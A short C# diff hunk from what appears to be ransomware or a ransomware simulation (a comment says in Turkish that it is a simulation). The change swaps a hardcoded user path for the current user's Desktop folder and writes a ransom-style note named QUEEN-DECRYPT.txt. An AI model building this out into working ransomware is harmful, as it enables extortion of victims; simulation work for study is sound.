@@ -45,7 +45,7 @@ NOT: Bu bir simülasyonudur.
         
         try
         {
-            string desktop = @"C:\Users\metin\OneDrive\Desktop\cry";
+            string desktop = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "cry");
             string instructionsPath = Path.Combine(desktop, "QUEEN-DECRYPT.txt");
             File.WriteAllText(instructionsPath, message);
         }
